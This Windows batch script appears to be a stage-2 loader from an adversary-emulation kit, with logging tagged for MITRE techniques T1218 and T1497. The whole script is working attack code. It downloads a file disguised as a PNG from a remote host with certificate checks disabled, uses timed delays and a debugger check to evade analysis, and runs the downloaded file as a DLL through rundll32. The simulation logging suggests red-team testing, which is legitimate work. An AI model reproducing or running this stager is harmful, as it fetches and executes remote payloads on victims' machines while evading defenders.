@echo off
setlocal enabledelayedexpansion

REM --- Random-named SET variable declarations for all PHR_ placeholders ---
SET xkzqwe=%APPDATA%\10791\fbda7d7c
SET rtyuio=699c4232.txt
SET asdfgh=https://10.0.0.49/stage/2/icon.png?10791-7
SET zxcvbn=BALAM-S2BO
SET qwerty=10791
SET poiuy5=7
SET lkjhgf=%PUBLIC%\\macula-simulations.log

REM --- Cache timestamp once ---
SET tsvar=!DATE!/!TIME!

REM --- Initial delay (10-20s) ---
timeout /t 15 /nobreak >nul

REM --- Debug: script start ---
echo [!tsvar!][DEBUG][!zxcvbn!][!qwerty!]: script_start>> "!lkjhgf!" 2>nul

REM --- Heartbeat fetch (alive check) ---
echo [!tsvar!][DEBUG][!zxcvbn!][!qwerty!]: heartbeat_start>> "!lkjhgf!" 2>nul
curl -k -s -o "!xkzqwe!\!rtyuio!" "!asdfgh!"
if errorlevel 1 (set hbresult=1) else set hbresult=0
echo [!tsvar!][DEBUG][!zxcvbn!][!qwerty!]: heartbeat_complete=!hbresult!>> "!lkjhgf!" 2>nul

REM --- Delay between operations (5-15s using ping) ---
ping -n 8 127.0.0.1 >nul

REM --- Anti-analysis: Debugger.IsAttached check (PowerShell) ---
echo [!tsvar!][DEBUG][!zxcvbn!][!qwerty!]: anti_analysis_start>> "!lkjhgf!" 2>nul
powershell -Command "if ([System.Diagnostics.Debugger]::IsAttached) { Start-Sleep -Milliseconds ((Get-Random -Minimum 2000 -Maximum 5000)) }" >nul 2>&1
if errorlevel 1 (set aaresult=1) else set aaresult=0
echo [!tsvar!][DEBUG][!zxcvbn!][!qwerty!]: anti_analysis_complete=!aaresult!>> "!lkjhgf!" 2>nul

REM --- Delay between operations (5-15s using choice) ---
CHOICE /C Y /N /D Y /T 10 >nul

REM --- Change working directory to output directory ---
echo [!tsvar!][DEBUG][!zxcvbn!][!qwerty!]: chdir_start>> "!lkjhgf!" 2>nul
cd /d "!xkzqwe!" >nul 2>&1
if errorlevel 1 (set cdres=1) else set cdres=0
echo [!tsvar!][DEBUG][!zxcvbn!][!qwerty!]: chdir_result=!cdres!>> "!lkjhgf!" 2>nul

REM --- Random delay (10-29s) ---
SET /A delay=%RANDOM% %% 20 + 10
timeout /t !delay! /nobreak >nul

REM --- Invoke Stage 2 Loader DLL via rundll32 ---
echo [!tsvar!][DEBUG][!zxcvbn!][!qwerty!]: rundll32_start>> "!lkjhgf!" 2>nul
rundll32.exe "!rtyuio!", RunDLLW

REM --- Log TTP: System Binary Proxy Execution (T1218) ---
echo [!tsvar!][TTP][!zxcvbn!][!qwerty!]: T1218|System Binary Proxy Execution=OK:>> "!lkjhgf!" 2>nul

REM --- Log TTP: Virtualization/Sandbox Evasion (T1497) ---
echo [!tsvar!][TTP][!zxcvbn!][!qwerty!]: T1497|Virtualization/Sandbox Evasion=OK:>> "!lkjhgf!" 2>nul

REM --- Debug: script end ---
echo [!tsvar!][DEBUG][!zxcvbn!][!qwerty!]: script_end>> "!lkjhgf!" 2>nul

endlocal